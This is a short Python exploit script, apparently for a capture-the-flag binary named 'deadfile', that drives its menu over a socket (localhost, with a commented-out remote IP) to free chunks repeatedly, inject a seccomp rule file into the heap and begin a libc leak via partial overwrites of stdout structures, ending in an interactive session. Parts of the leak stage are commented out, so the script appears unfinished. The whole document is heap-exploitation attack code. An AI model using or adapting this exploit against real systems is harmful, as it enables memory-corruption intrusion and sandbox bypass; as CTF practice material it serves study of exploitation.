from ptrlib import *

def new(size):
    sock.sendlineafter(">> ", "1")
    sock.sendlineafter(": ", str(size))
    return
def delete(index):
    sock.sendlineafter(">> ", "2")
    sock.sendlineafter(": ", str(index))
    return
def register(name):
    sock.sendlineafter(">> ", "7")
    sock.sendafter(": ", name)
    return

def fopen(filepath):
    sock.sendlineafter(">> ", "3")
    sock.sendafter(": ", filepath)
    return

def read(index, offset, data=None):
    sock.sendlineafter(">> ", "4")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", str(offset))
    if data is not None:
        sock.send(data)
    return

#sock = Process("./deadfile")
sock = Socket("localhost", 9999)
#sock = Socket("115.68.235.72", 33445)

# bypass seccomp
rule = open('rule.bin', 'rb').read()
rule += b'\x00' * (0x80 - len(rule))
new(0x80)
new(0x28)
new(0x98)
new(0x98)
#for i in range(6):
#    new(0x98)
for i in range(7):
    delete(2)
delete(0)
delete(0)
register(rule)

# libc leak
new(0)
delete(3)
"""
read(2, 3, data=b'\x60\x07\xdd')
read(2, 2, data=b'\xc0')
new(0)
new(0)
"""
#new(0x98)
#new(0x98)
#new(0x98) # _IO_2_1_stdout_


sock.interactive()
